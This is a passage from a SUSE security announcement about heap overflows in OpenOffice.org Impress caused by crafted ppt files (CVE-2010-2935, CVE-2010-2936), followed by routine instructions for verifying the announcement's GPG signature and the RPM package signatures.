Specially crafted ppt files could cause a heap based buffer overflow in
OpenOffice\_org Impress. Attackers could exploit that to crash
OpenOffice\_org or potentially even execute arbitrary code
(CVE-2010-2935, CVE-2010-2936).
This update also fixes numerous non-security bugs. Please refer to the
package changelog for details.
Affected Products: SLE10-SP3, SLE11, SLE11-SP1, openSUSE 11.1-11.3

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
